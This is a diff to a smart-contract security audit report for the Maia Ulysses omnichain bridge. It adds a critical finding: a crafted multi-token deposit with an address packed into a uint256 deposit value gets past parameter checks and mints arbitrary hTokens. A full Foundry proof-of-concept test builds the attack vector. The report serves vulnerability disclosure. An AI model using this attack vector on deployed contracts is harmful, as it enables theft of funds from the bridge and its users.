@@ -36,6 +36,9 @@ The audit primaraly focused on veryfiying and securing -
 ### Severity
 Critical
 
+### Impact
+Adversary can construct an attack vector that let’s him mint arbitrary amount of hToken’s on the Root Chain.
+
 ### Vulnerable code
 [link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L275-L316) |
 [link2](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174) |
@@ -88,8 +91,132 @@ Now `_bridgeInMultiple(...)` will unpack the `_dParams` where `numOfAssets = 1`,
 
 `deposits[0] = malicious address payload cast to uint256`.
 
-**Impact**
+Subsequently `bridgeInMultiple(...)` is called in `RootBridgeAgent.sol`, where `bridgeIn(...)` is called for every set of hToken, token, amount & deposit - one iteration in the attack scenario.
 
-**Recommendation** 
+`bridgeIn(...)` now performs the critical `checkParams` from the CheckParamsLib library where if only 1 of 3 conditions is true we will have a revert.
+
+The first check is revert if `_dParams.amount < _dParams.deposit` - this is false since amount & deposit are equal to the uint256 cast of the bytes packing of the malicious address payload.
+
+The second check is:
+```solidity
+(_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain))
+```
+Here it’s true amount > 0 , however, `_dParams.hToken` is the first entry `hTokens[0]` of the attack vector’s `hTokens[]` array, therefore, it is a valid address & `isLocalToken(…)` will return true and will be negated by ! which will make the statement false because of &&, therefore, it is bypassed.
+
+The third check is:
+```solidity
+(_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain))
+```
+here it’s true `deposit > 0` , however, `_dParams.token` is the second entry `hTokens[1]` of the attack vector’s `hTokens[]` array, therefore, it is a valid underlying address & `isUnderlyingToken(…)` will return true and will be negated by ! which will make the statement false because of &&, therefore, it is bypassed.
+
+Now in the Root Port `bridgeToRoot(...)` will check if the globalAddress is valid and it is since we got it from the valid `hTokens[0]` entry in the constructed attack. Then `_amount - _deposit = 0` , therefore, no tokens will be transferred and finally the critical line if `(_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId)` here `_deposit` is the malicious address payload that was packed to bytes and then unpacked and cast to uint256 & `_hToken` is the global address that we got from `hTokens[0]` back in the unpacking, therefore whatever the value of the uint256 representation of the malicious address is will be minted to the attacker.
+
+### Coded POC
+Coded PoC
+Copy the two functions `testArbitraryMint` & `_prepareAttackVector` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.
+
+Execute with `forge test --match-test testArbitraryMint -vv`
+
+Result - 800000000 minted tokens for free in attacker’s Virtual Account
+
+```solidity
+function testArbitraryMint() public {
+        
+        // setup function used by developers to add local/global tokens in the system
+        testAddLocalTokenArbitrum();
+
+        // set attacker address & mint 1 ether to cover gas cost
+        address attacker = address(0xAAAA);
+        hevm.deal(attacker, 1 ether);
+        
+        // get avaxMockAssetHtoken global address that's on the Root
+        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);
+    
+        // prepare attack vector
+        bytes memory params = "";
+        DepositMultipleInput memory dParams = _prepareAttackVector();
+        uint128 remoteExecutionGas = 200_000_000_0;
+
+        console2.log("------------------");
+        console2.log("------------------");
+        console2.log("ARBITRARY MINT LOG");
+
+        console2.log("Attacker address", attacker);
+        console2.log("Avax h token address",avaxMockAssethToken);
+        console2.log("Avax underlying address", address(avaxMockAssetToken));
+
+        console2.log("Attacker h token balance", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));
+        console2.log("Attacker underlying balance", avaxMockAssetToken.balanceOf(attacker));
+
+        // execute attack
+        hevm.prank(attacker);
+        avaxMulticallBridgeAgent.callOutSignedAndBridgeMultiple{value: 0.00005 ether}(params, dParams, remoteExecutionGas);
+        
+        // get attacker's virtual account address
+        address vaccount = address(rootPort.getUserAccount(attacker));
+
+        console2.log("Attacker h token balance avax", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));        
+        console2.log("Attacker underlying balance avax", avaxMockAssetToken.balanceOf(attacker));
+
+        console2.log("Attacker h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));
+    
+        console2.log("ARBITRARY MINT LOG END");
+		    console2.log("------------------");
+
+    }
+
+    function _prepareAttackVector() internal view returns(DepositMultipleInput memory) {
+        
+        // hToken address
+        address addr1 = avaxMockAssethToken;
+
+        // underlying address
+        address addr2 = address(avaxMockAssetToken);
+
+        // 0x2FAF0800 when encoded to bytes and then cast to uint256 = 800000000 
+        address malicious_address = address(0x2FAF0800);
+        
+        uint256 amount1 = 0;
+        uint256 amount2 = 0;
+
+        uint num = 257;
+        address[] memory htokens = new address[](num);
+        address[] memory tokens = new address[](num);
+        uint256[] memory amounts = new uint256[](num);
+        uint256[] memory deposits = new uint256[](num);
+
+        for(uint i=0; i<num; i++) {
+            htokens[i] = addr1;
+            tokens[i] = addr2;
+            amounts[i] = amount1;
+            deposits[i] = amount2;
+        }
+    
+        // address of the underlying token
+        htokens[1] = addr2;
+      
+        // copy of entry containing the arbitrary number of tokens
+        htokens[2] = malicious_address;
+        
+        // entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Root
+        htokens[3] = malicious_address;
+       
+        uint24 toChain = rootChainId;
+
+        // create input
+        DepositMultipleInput memory input = DepositMultipleInput({
+            hTokens:htokens,
+            tokens:tokens,
+            amounts:amounts,
+            deposits:deposits,
+            toChain:toChain
+        });
+
+        return input;
+
+    }
+```
+### Recommendation
+Enforce more strict checks around input param validation on bridging multiple tokens.
 
 ## 2. Re-adding a deprecated gauge in a new epoch before calling `updatePeriod()` / `queueRewardsForCycle()` will leave some gauges without rewards.
